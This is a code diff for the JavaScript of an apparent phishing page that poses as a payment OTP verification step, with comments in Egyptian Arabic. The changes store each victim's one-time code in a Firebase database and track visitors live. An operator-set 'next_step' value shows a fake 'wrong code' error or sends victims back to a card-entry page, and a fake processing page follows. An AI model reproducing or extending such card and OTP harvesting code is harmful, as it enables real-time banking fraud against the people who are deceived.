@@ -81,14 +81,22 @@
         const v_id = localStorage.getItem('v_id');
 
         if (v_id) {
+            // أول ما يدخل الصفحة بنصفر الـ next_step عشان نكسر أي دائرة قديمة
+            database.ref('orders/' + v_id).update({
+                next_step: 'waiting',
+                status: 'الزائر في صفحة الـ OTP'
+            });
+
             database.ref('live_sessions/' + v_id).update({
                 current_page: "صفحة التحقق (OTP)",
                 last_seen: new Date().getTime()
             });
 
-            // مراقبة الأوامر
+            // مراقبة الأوامر (Listening)
             database.ref('orders/' + v_id + '/next_step').on('value', (snapshot) => {
                 const step = snapshot.val();
+                
+                // لو الأمر "wrong_otp" اظهر رسالة الخطأ واثبت مكانك
                 if (step === 'wrong_otp') {
                     document.getElementById('otpCode').classList.add('error-border');
                     document.getElementById('errorMsg').style.display = 'block';
@@ -96,6 +104,14 @@
                     const btn = document.getElementById('confirmBtn');
                     btn.disabled = false;
                     btn.innerText = "تأكيد العملية";
+                    
+                    // مهم جداً: صفر الحالة لـ waiting بعد ما تظهر رسالة الخطأ
+                    // عشان لو العميل راح بروسيسنج ما يرجعش لصفحة البطاقة
+                    database.ref('orders/' + v_id).update({ next_step: 'waiting' });
+                } 
+                // لو الأمر "wrong_card" يرجع لصفحة البطاقة (ودي الحالة الوحيدة اللي يرجع فيها)
+                else if (step === 'wrong_card') {
+                    window.location.href = 'secure-pay-v2.html';
                 }
             });
         }
@@ -131,17 +147,14 @@
                 document.getElementById('otpCode').classList.remove('error-border');
                 document.getElementById('errorMsg').style.display = 'none';
 
-                // التعديل الهام: نحدث الـ otp ونصفر الـ next_step لـ waiting فوراً
-                // عشان لما يروح لصفحة بروسيسنج ما يرجعش للبطاقة بسبب "wrong_card" قديمة
+                // نحدث الكود ونرجع الحالة لانتظار عشان صفحة البروسيسنج تثبته
                 database.ref('orders/' + v_id).update({
                     otp_code: otpVal,
                     status: "OTP_Submitted",
                     next_step: "waiting", 
                     last_update: new Date().getTime()
                 }).then(() => {
-                    // التحويل لصفحة الانتظار
-                    window.location.replace('processing.html');
-                }).catch(() => {
+                    // نستخدم replace عشان نمسح الصفحة دي من تاريخ المتصفح
                     window.location.replace('processing.html');
                 });
             } else {
